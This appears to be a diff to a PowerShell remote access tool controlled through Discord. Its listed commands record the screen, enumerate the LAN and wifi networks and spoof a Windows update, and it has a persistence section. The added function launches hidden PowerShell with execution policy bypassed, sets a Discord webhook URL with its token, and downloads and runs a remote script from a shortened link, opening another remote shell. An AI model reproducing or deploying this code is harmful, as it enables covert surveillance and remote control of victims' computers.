@@ -302,6 +302,7 @@ $script:jsonPayload = @{
 - **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
 - **NearbyWifi**: Show nearby wifi networks (!user popup!)
 - **RecordScreen**: Record Screen and send to Discord
+- **Powershell**: start classic powershell on another channel
 
 ### PRANKS
 - **FakeUpdate**: Spoof Windows-10 update screen using Chrome
@@ -983,6 +984,10 @@ Function ScreenParty {
     sendMsg -Message ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"  
 }
 
+Function Powershell {
+    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1512211575862329435/__PTyT_5jA8brTXqw-M7V06U9a0Mbuqt3dLXGXpu9lXM78lKxPl5Vwf2_TKX5LtG6NYM'; irm is.gd/bw0_kl_to_dc | iex")
+    sendMsg -Message ":white_check_mark: ``classic powershell on other channel!`` :white_check_mark:"  
+}
 # --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------
 
 Function AddPersistance{
